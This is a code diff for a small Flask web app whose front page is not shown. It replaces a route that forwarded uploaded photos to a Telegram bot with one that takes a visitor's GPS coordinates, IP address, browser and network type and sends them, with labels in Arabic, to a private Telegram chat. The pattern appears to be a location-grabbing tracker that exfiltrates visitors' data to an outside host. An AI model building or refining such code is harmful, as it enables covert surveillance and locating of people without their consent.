@@ -3,7 +3,7 @@ import os
 import requests
 from dotenv import load_dotenv
 
-load_dotenv()  # تحميل متغيرات البيئة من ملف .env
+load_dotenv()
 
 app = Flask(__name__)
 
@@ -19,21 +19,32 @@ TELEGRAM_API_URL = f"https://api.telegram.org/bot{TOKEN}"
 def index():
     return send_file("index.html")
 
-@app.route("/upload_photo", methods=["POST"])
-def upload_photo():
-    if "photo" not in request.files:
-        return jsonify({"success": False, "error": "لم يتم رفع صورة"}), 400
-    
-    photo = request.files["photo"]
+@app.route("/send_client_info", methods=["POST"])
+def send_client_info():
+    data = request.get_json()
+    latitude = data.get("latitude")
+    longitude = data.get("longitude")
+    ip = data.get("ip")
+    user_agent = data.get("userAgent")
+    network_type = data.get("networkType")
+    timestamp = data.get("timestamp")
 
-    # التأكد من أن الملف صورة
-    if not photo.mimetype.startswith("image/"):
-        return jsonify({"success": False, "error": "الملف ليس صورة"}), 400
+    if not all([latitude, longitude, ip, user_agent, timestamp]):
+        return jsonify({"success": False, "error": "بيانات ناقصة"}), 400
 
-    files = {"photo": (photo.filename, photo.stream, photo.mimetype)}
-    data = {"chat_id": CHAT_ID}
+    message = (
+        f"📍 الموقع الجغرافي:\nخط العرض: {latitude}\nخط الطول: {longitude}\n\n"
+        f"🌐 عنوان IP: {ip}\n"
+        f"🖥️ نوع المتصفح: {user_agent}\n"
+        f"📡 نوع الشبكة: {network_type}\n"
+        f"⏰ الوقت: {timestamp}"
+    )
 
-    resp = requests.post(f"{TELEGRAM_API_URL}/sendPhoto", data=data, files=files)
+    resp = requests.post(f"{TELEGRAM_API_URL}/sendMessage", data={
+        "chat_id": CHAT_ID,
+        "text": message
+    })
+
     if resp.status_code == 200:
         return jsonify({"success": True})
     else:
